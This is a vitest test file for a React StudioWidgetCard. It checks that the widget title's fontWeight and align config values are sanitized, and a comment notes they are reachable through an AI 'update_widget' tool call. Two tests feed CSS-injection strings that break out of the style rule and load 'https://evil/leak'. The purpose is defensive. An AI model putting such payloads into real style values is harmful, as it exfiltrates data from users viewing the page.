import * as React from 'react';
import { createRenderer, within } from '@mui/internal-test-utils';
import { describe, expect, it } from 'vitest';
import type { StudioWidget, StudioWidgetConfig } from '../../models';
import { createStudioHarness } from '../../internals/test-utils';
import { StudioWidgetCard } from './StudioWidgetCard';

const { render } = createRenderer();

/**
 * Finding 2: `widget.config.textTitleFontWeight` / `textTitleAlign` used to be spread
 * into the title `Typography`'s `sx` unvalidated, in the same object whose
 * color/fontFamily/fontSize siblings are already sanitized. Both are doc-authored
 * config reachable via `loadSerializedState`/the AI `update_widget` tool call, and
 * Emotion does not escape interpolated `sx` property values.
 */

function widget(config: StudioWidgetConfig): StudioWidget {
  return { id: 'w1', kind: 'text', title: 'My widget', config };
}

function setup(config: StudioWidgetConfig) {
  const { wrapper } = createStudioHarness({
    initialState: { doc: { widgets: { w1: widget(config) } } },
  });
  const { container } = render(<StudioWidgetCard widgetId="w1" pageId="page-1" />, { wrapper });
  return within(container).getByText('My widget');
}

describe('StudioWidgetCard title fontWeight/align sanitization (finding 2)', () => {
  it('applies a valid numeric fontWeight and align keyword', () => {
    const title = setup({
      textBody: 'x',
      textTitleFontWeight: 700,
      textTitleAlign: 'center',
    } as StudioWidgetConfig);
    expect(getComputedStyle(title).fontWeight).toBe('700');
    expect(getComputedStyle(title).textAlign).toBe('center');
  });

  it('rejects an out-of-range/invalid fontWeight instead of propagating it', () => {
    const bogus = setup({
      textBody: 'x',
      textTitleFontWeight: 'bold; } .x{background:url(https://evil/leak)' as unknown as number,
    } as StudioWidgetConfig);
    const clean = setup({ textBody: 'x' } as StudioWidgetConfig);
    expect(getComputedStyle(bogus).fontWeight).toBe(getComputedStyle(clean).fontWeight);
  });

  it('rejects an invalid align value instead of propagating it', () => {
    const bogus = setup({
      textBody: 'x',
      textTitleAlign: 'left; } .x{background:url(https://evil/leak)' as unknown as
        | 'left'
        | 'center'
        | 'right',
    } as StudioWidgetConfig);
    const clean = setup({ textBody: 'x' } as StudioWidgetConfig);
    expect(getComputedStyle(bogus).textAlign).toBe(getComputedStyle(clean).textAlign);
  });
});
